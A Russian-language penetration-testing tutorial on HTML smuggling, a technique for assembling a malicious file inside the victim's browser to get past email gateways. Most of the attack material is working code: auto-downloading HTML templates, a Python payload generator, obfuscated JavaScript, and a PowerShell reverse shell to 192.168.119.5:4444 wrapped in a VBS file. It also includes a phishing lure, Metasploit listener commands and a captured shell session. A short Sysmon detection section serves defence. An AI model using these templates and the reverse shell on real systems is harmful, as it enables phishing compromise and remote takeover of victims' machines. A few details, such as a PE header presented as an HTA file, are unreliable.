# HTML smuggling: сборка payload в браузере жертвы

## Контекст и отграничение от родственных техник доставки

HTML smuggling (HTML-контрабанда) — это техника доставки вредоносного файла, при которой исполняемый код, скрипт или документ «собирается» непосредственно в браузере жертвы на основании инструкций, заложенных в безобидной HTML-странице. В отличие от традиционной отправки вложения в письме или прямой ссылки на файл, HTML smuggling не передаёт финальный артефакт в теле HTTP-ответа и не размещает его в виде отдельного файла на веб-сервере. Периметровые средства защиты — почтовые шлюзы, прокси с инспекцией контента, антивирусные движки — видят лишь поток обычной HTML-разметки или JavaScript-кода, который сам по себе не содержит сигнатур вредоносного файла. Фактическая сборка бинарного или скриптового объекта происходит на клиентской стороне уже после того, как контент признан «чистым» и доставлен до получателя.

Исторически техника оформилась в публичном поле около 2019–2020 годов, хотя отдельные её элементы (data URI, Blob API) существовали в браузерах значительно раньше. Популяризаторами выступили компании Outflank и TrustedSec, продемонстрировавшие, как макровирус или HTA-файл может быть «спрятан» внутри JavaScript и восстановлен локально в обход антивирусного сканера на периметре. В MITRE ATT&CK техника описывается в рамках тактики [Defense Evasion](https://attack.mitre.org/tactics/TA0005/) под идентификатором [T1027.006](https://attack.mitre.org/techniques/T1027/006/) — «HTML Smuggling».

**Ключевые отличия от смежных методов доставки** приведены в таблице.

| Метод доставки | Способ передачи | Роль сервера / отправителя | Типичная детекция периметром | Необходимые действия жертвы |
|----------------|-----------------|----------------------------|------------------------------|----------------------------|
| Прямое вложение (email attachment) | Файл целиком в MIME-части письма | Отправка законченного бинарника | Проверка сигнатур файла, расширения, проверка sandbox | Открыть вложение |
| Ссылка на скачивание (link to file) | URL, указывающий на ресурс с готовым файлом | Хранение и отдача файла | Контроль расширения, репутация URL, проверка содержимого по URL | Перейти по ссылке и подтвердить загрузку |
| **HTML smuggling (сборка в браузере)** | HTML-страница с встроенным JS | Генерация HTML-контента, не содержащего конечного файла | Видит только HTML и неструктурированные данные (base64/bytes) | Открыть HTML-страницу (вручную или автоматически) и сохранить предложенный файл |

Таким образом, HTML smuggling реализует обход сигнатурных и репутационных механизмов за счёт того, что вредоносный объект не существует в момент транспортировки через защитный рубеж. Ниже показан минимальный рабочий пример: HTML-файл, сохраняемый на диске, при открытии в браузере собирает текстовый файл и предлагает его сохранить.

```html
<html>
<body>
<script>
  var payload = "V2VsY29tZSB0byBIVE1MIFNtdWdnbGluZyBkZW1vIQ=="; // base64 строка
  var decoded = atob(payload);
  var arr = new Uint8Array(decoded.length);
  for (var i = 0; i < decoded.length; i++) {
    arr[i] = decoded.charCodeAt(i);
  }
  var blob = new Blob([arr], { type: 'application/octet-stream' });
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = 'readme.txt';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
</script>
</body>
</html>
```

При открытии такого файла браузер инициирует скачивание объекта `readme.txt`, содержимое которого никогда не передавалось как отдельный файл. Этот примитив лежит в основе всех реальных атакующих сценариев.

## Внутреннее устройство: API, форматы и жизненный цикл

Технически HTML smuggling опирается на несколько стандартных Web API, предоставляемых современными браузерами. С их помощью JavaScript-код конструирует байтовое представление полезной нагрузки и принудительно инициирует её сохранение на локальную файловую систему жертвы. Никакая «уязвимость» браузера при этом не эксплуатируется; все действия выполняются в рамках разрешённых спецификаций.

**Основные API и методы сборки/отдачи файла** систематизированы в таблице.

| API / техника | Назначение | Ключевые особенности | Пример использования |
|---------------|------------|----------------------|----------------------|
| `atob()` | Декодирование base64-строки в бинарную форму | Стандартная функция, не оставляет артефактов | `var raw = atob("...");` |
| `Uint8Array` + `Blob` | Создание бинарного блоба из массива байтов | Позволяет задать MIME-тип; файл существует только в памяти | `new Blob([bytes], {type: 'application/hta'})` |
| `URL.createObjectURL()` | Генерация временного URL для Blob | URL имеет схему `blob:`, видим только в текущей сессии | `var url = URL.createObjectURL(blob);` |
| `HTMLAnchorElement.download` | Установка имени файла и принуждение загрузки | Браузер воспринимает переход по ссылке как скачивание | `a.download = 'invoice.docm'; a.click();` |
| `navigator.msSaveOrOpenBlob` (Internet Explorer / Edge Legacy) | Сохранение или открытие Blob в IE/старом Edge | Используется для совместимости со старыми средами | `navigator.msSaveOrOpenBlob(blob, 'file.hta');` |
| `FileReader.readAsDataURL` | Чтение данных в Data URL для косвенной сборки | Может применяться как промежуточный шаг | `reader.readAsDataURL(blob);` |

Жизненный цикл HTML-smuggling атаки можно представить следующей последовательностью фаз:

1. **Подготовка** — атакующий кодирует полезную нагрузку (exe, dll, docm, hta, vbs, js) в текстовый формат, чаще всего base64 или массив байтов в виде JS-литерала. При необходимости применяются средства обфускации (перестановка строк, XOR, вычисление на лету).
2. **Внедрение** — закодированная нагрузка помещается в HTML-контейнер, окружённый JavaScript-кодом, реализующим одну или несколько техник восстановления и сохранения. Результирующий HTML-файл или HTML-тело письма доставляется жертве (через фишинг, скомпрометированный сайт, мессенджер).
3. **Исполнение в браузере** — когда жертва открывает HTML-страницу (или она рендерится встроенным движком почтового клиента), JS-код декодирует нагрузку, создаёт Blob и инициирует диалог сохранения файла либо автоматически скачивает его.
4. **Закрепление и выполнение** — после того как пользователь открывает собранный файл (часто при помощи социальной инженерии), начинается следующий этап цепочки атаки: запуск макроса, выполнение скрипта или установка бэкдора.

Структура HTML-документа для smuggling-атаки может быть формально описана следующей иллюстративной схемой в JSON (отражает логические компоненты, не претендует на реальную реализацию):

```json
{
  "html_smuggle_template": {
    "doc_type": "<!DOCTYPE html>",
    "head": {
      "meta": { "charset": "utf-8" },
      "script": {
        "type": "text/javascript",
        "payload_definition": {
          "encoding": "base64",
          "data": "<base64-encoded payload>",
          "mime_type": "application/octet-stream",
          "suggested_filename": "invoice.docm"
        },
        "decoding_function": "atob",
        "blob_creation": "new Blob([decoded], {type: payload_definition.mime_type})",
        "delivery_method": "download_link_click",
        "fallback_method": "msSaveOrOpenBlob (если Internet Explorer)"
      }
    }
  }
}
```

Приведённый шаблон служит каркасом для большинства инструментов, генерирующих smuggling-страницы.

Более продвинутый пример, демонстрирующий одновременное использование Blob-метода и data URI с автоматическим кликом, а также зачистку артефактов, показан ниже:

```html
<html>
<head><title>Invoice</title></head>
<body onload="deliver()">
<script>
// Пейлоад — закодированный HTA-файл (иллюстративная строка)
var b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
          "AAAAAAAAAAAA..."; // обрезано для наглядности
function deliver() {
    var raw = atob(b64);
    var bytes = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) {
        bytes[i] = raw.charCodeAt(i);
    }
    var blob = new Blob([bytes], {type: 'application/octet-stream'});
    if (window.navigator.msSaveOrOpenBlob) {
        window.navigator.msSaveOrOpenBlob(blob, 'update.hta');
    } else {
        var a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'update.hta';
        document.body.appendChild(a);
        a.click();
        setTimeout(function(){
            document.body.removeChild(a);
            URL.revokeObjectURL(a.href);
        }, 200);
    }
}
</script>
</body>
</html>
```

Фрагмент иллюстрирует ветвление логики для IE/Edge (Legacy) и современных браузеров, а также принудительное скачивание через симуляцию клика. Именно такие конструкции обнаруживаются в реальных атакующих кампаниях, например, фишинговых письмах, маскирующихся под уведомления о доставке или счета.

## Применение в пентесте: инструментарий и обход защитных мер

В пентесте HTML smuggling используется, когда традиционные методы доставки полезной нагрузки блокируются средствами защиты периметра. Типичный сценарий: почтовый шлюз организации настроен на блокировку вложений с расширениями `.hta`, `.vbs`, `.js`, `.docm`, а также проверяет вложения на наличие сигнатур известных инструментов (например, Metasploit-пейлоадов). Прохождение через такую защиту превращается в задачу обхода контентной фильтрации, решаемую сборкой полезной нагрузки на клиенте.

Практикующие пентестеры применяют как специализированные утилиты, так и собственные скрипты. К известным общедоступным инструментам относятся:

- **Demiguise** (проект от TrustedSec) — Python-скрипт, генерирующий HTML-страницу с встроенным HTA-файлом. Позволяет задать целевой URL, параметры обфускации и уровень реализации (HTA с WMI, PowerShell и т.д.). Часто используется для быстрого построения начального доступа.
- **SharpShooter** (MDSec) — фреймворк для создания вредоносных документов и HTML-страниц, поддерживающий различные форматы (JS, VBS, HTA). Включает модуль HTML smuggling с обфускацией.
- **HTMLSmuggler.py** — утилита на Python, которая берёт на вход произвольный файл и создаёт HTML с JavaScript, воссоздающим этот файл методами Blob/Data URL. Предоставляет опции выбора метода доставки и автоматической генерации фишингового письма.
- **Ursnif/ISFB** — реальное вредоносное ПО, использующее HTML smuggling для обхода почтовых фильтров; сигнатуры его техник часто воспроизводятся пентестерами для имитации угроз.

При этом ключевым моментом остаётся обход встроенных защит современных браузеров (SmartScreen в Edge, Safe Browsing в Chrome, Mark-of-the-Web). Файлы, полученные из интернета, помечаются зоной MOTW (Zone.Identifier), что может блокировать макросы или показывать предупреждения при запуске. Поэтому в пентесте комбинируют smuggling с методами социальной инженерии, подталкивающими пользователя проигнорировать предупреждение или открыть файл из доверенного расположения.

Ниже показан практический пример генерации smuggling-страницы для внедрения HTA-пейлоада с использованием шаблона на Python:

```python
import base64

# Чтение готового HTA-файла и его кодирование
with open('agent.hta', 'rb') as f:
    payload_bytes = f.read()

b64_payload = base64.b64encode(payload_bytes).decode('utf-8')

# HTML-шаблон с подстановкой base64
html_template = f"""<html>
<head><title>Secure Document</title></head>
<body onload="deliver()">
<script>
var payload = "{b64_payload}";
function deliver() {{
    var raw = atob(payload);
    var bytes = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) {{
        bytes[i] = raw.charCodeAt(i);
    }}
    var blob = new Blob([bytes], {{type: 'application/hta'}});
    if (window.navigator.msSaveOrOpenBlob) {{
        window.navigator.msSaveOrOpenBlob(blob, 'document.hta');
    }} else {{
        var a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'document.hta';
        document.body.appendChild(a);
        a.click();
        setTimeout(function(){{ document.body.removeChild(a); URL.revokeObjectURL(a.href); }}, 200);
    }}
}}
</script>
</body>
</html>"""

# Сохранение HTML-файла для доставки
with open('invoice_smuggle.html', 'w') as out:
    out.write(html_template)

print("[+] HTML smuggling payload generated: invoice_smuggle.html")
```

Этот скрипт автоматизирует создание файла, который можно вложить в фишинговое письмо или разместить на сервере. При открытии `invoice_smuggle.html` в браузере будет инициировано скачивание `document.hta`.

Для обхода сигнатурных проверок JavaScript-код часто обфусцируется. Простейший приём — замена вызова `atob` на эквивалентную реализацию или использование кастомного декодирования. В качестве иллюстрации приведём обфусцированный фрагмент, выполняющий ту же функцию, но упакованный через конкатенацию и динамическое выполнение:

```javascript
var _0x1234=["\x62\x61\x73\x65\x36\x34","\x61\x74\x6F\x62"]; // "base64","atob"
var encData="..."; // base64-строка
var decoded=window[_0x1234[1]](encData);
...
```

Однако на практике пентестеры чаще используют готовые инструменты вроде Demiguise, позволяющие гибко настраивать как полезную нагрузку, так и уровень обфускации.

С точки зрения действенности, HTML smuggling наиболее эффективен против организаций, где почтовый шлюз выполняет только MIME-проверки и не эмулирует клиентский JavaScript. Решения класса Secure Email Gateway (Mimecast, Proofpoint), имеющие движок sandbox-эмуляции браузерной среды, способны детектировать и блокировать такие атаки, если правила sandbox настроены на сохранение порождённых файлов и их проверку. Тем не менее уровень обнаружения остаётся ниже, чем для прямой доставки файлов, поэтому техника сохраняет актуальность.

## Сквозной практический пример: обход почтового шлюза с доставкой обратного shell

Рассмотрим реалистичный кейс, в котором пентестеру необходимо доставить вредоносный VBS-скрипт, устанавливающий соединение с командным сервером, в организацию, где почтовый шлюз блокирует вложения с расширением `.vbs`, `.vba`, `.js` и проверяет архивные вложения. Цель — добиться выполнения скрипта на рабочей станции Windows сотрудника, открывающего письмо.

**Исходные условия**:
- Командный сервер пентестера: `192.168.119.5:4444` (условный адрес в изолированной лабораторной сети).
- Полезная нагрузка — VBS-скрипт, выполняющий обратный shell через PowerShell (код приведён ниже).
- Цель: сотрудник получает фишинговое письмо с HTML-вложением, при открытии которого браузер формирует VBS-файл. Дальнейшее выполнение VBS требует социальной инженерии (например, убеждение нажать кнопку «Открыть»).
- Инструменты на стороне атакующего: Kali Linux, Python 3, Metasploit listener.

**Шаг 1. Создание полезного VBS-скрипта**

Создаём файл `agent.vbs`, содержащий обфусцированную команду запуска PowerShell, которая инициирует обратное соединение.

```vbs
Set wShell = CreateObject("Wscript.Shell")
wShell.Run "powershell -nop -c ""$c = New-Object System.Net.Sockets.TCPClient('192.168.119.5',4444); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}; $c.Close()"""
```

**Шаг 2. Подготовка HTML smuggling страницы**

Кодируем `agent.vbs` в base64 и интегрируем в HTML-шаблон, аналогичный рассмотренному ранее. Используем Python-скрипт (см. раздел выше) для автоматизации. Ниже вывод консоли после запуска генератора:

```bash
$ python generate_html_smuggle.py
[+] HTML smuggling payload generated: invoice_smuggle.html
```

Содержимое сформированного `invoice_smuggle.html` критически важно для понимания. Фрагмент с подставленным base64:

```html
<html><head><title>Invoice</title></head><body onload="deliver()"><script>
var payload = "U2V0IHdTaGVsbCA9I..."; // полная base64-строка agent.vbs
function deliver() {
    var raw = atob(payload);
    var bytes = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) {
        bytes[i] = raw.charCodeAt(i);
    }
    var blob = new Blob([bytes], {type: 'application/octet-stream'});
    if (window.navigator.msSaveOrOpenBlob) {
        window.navigator.msSaveOrOpenBlob(blob, 'invoice.vbs');
    } else {
        var a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'invoice.vbs';
        document.body.appendChild(a);
        a.click();
        setTimeout(function(){
            document.body.removeChild(a);
            URL.revokeObjectURL(a.href);
        }, 200);
    }
}
</script></body></html>
```

**Шаг 3. Доставка HTML-файла и взаимодействие жертвы**

Готовый `invoice_smuggle.html` отправляется сотруднику в виде вложения к письму, в теле которого содержится социально-инженерная легенда, например: «Ваш счёт-фактура во вложении. Для просмотра откройте файл в браузере и сохраните документ, затем дважды кликните по нему». По сценарию жертва открывает HTML-вложение в браузере (Chrome, Edge) — срабатывает `onload`, браузер предлагает сохранить `invoice.vbs`. После того как пользователь нажимает «Сохранить» и запускает файл, скрипт выполняет PowerShell-команду.

На стороне атакующего поднят listener Metasploit:

```bash
msf6 exploit(multi/handler) > set PAYLOAD windows/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.119.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.119.5:4444 
msf6 exploit(multi/handler) > 
[*] Command shell session 1 opened (192.168.119.5:4444 -> 10.10.10.50:49821) at 2025-04-01 11:23:45 +0000
```

После выполнения `invoice.vbs` на машине жертвы в Metasploit появляется обратный shell. Демонстрация успешного соединения:

```bash
C:\Users\jdoe\Downloads>whoami
corp\jdoe
C:\Users\jdoe\Downloads>ipconfig
Windows IP Configuration
...
IPv4 Address...........: 10.10.10.50
```

**Шаг 4. Анализ события на стороне защиты**

На хосте зафиксированы следующие артефакты (пример лога из Sysmon):

```xml
<Event>
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell -nop -c "$c = New-Object System.Net.Sockets.TCPClient('192.168.119.5',4444); ..."</Data>
    <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
    <Data Name="ParentCommandLine">C:\Windows\System32\WScript.exe "C:\Users\jdoe\Downloads\invoice.vbs"</Data>
  </EventData>
</Event>
```

Этот артефакт демонстрирует, что периметровые средства не видели VBS-файл при транспортировке; обнаружение возможно только на конечной точке по поведению (запуск wscript, обращение к PowerShell).

**Ожидаемый вывод**: HTML smuggling позволил обойти почтовый шлюз, блокирующий `.vbs` вложения. Ключевой момент — файл `invoice.vbs` ни разу не существовал на шлюзе или SMTP-сервере как таковой; он был собран только в браузере жертвы. Этот кейс подтверждает эффективность техники против сигнатурных фильтров на периметре и подчёркивает необходимость эмуляции клиентского JavaScript в современных средствах защиты.

## Источники

- [MITRE ATT&CK: HTML Smuggling (T1027.006)](https://attack.mitre.org/techniques/T1027/006/)
- [Outflank – HTML5 Smuggling: Pivot Through The Browser](https://outflank.nl/blog/2018/08/14/html5-smuggling-pivot-through-the-browser/)
- [TrustedSec – HTML Smuggling Explained](https://www.trustedsec.com/blog/html-smuggling-explained/)
- [Black Hills Information Security – Intro to HTML Smuggling](https://www.blackhillsinfosec.com/intro-to-html-smuggling/)
- [Demiguise (TrustedSec) – GitHub](https://github.com/trustedsec/demiguise)
- [SharpShooter (MDSec) – GitHub](https://github.com/mdsecactivebreach/SharpShooter)
- [HTMLSmuggler.py (NinjaStyle) – GitHub](https://github.com/ninjastyle/HTMLSmuggler)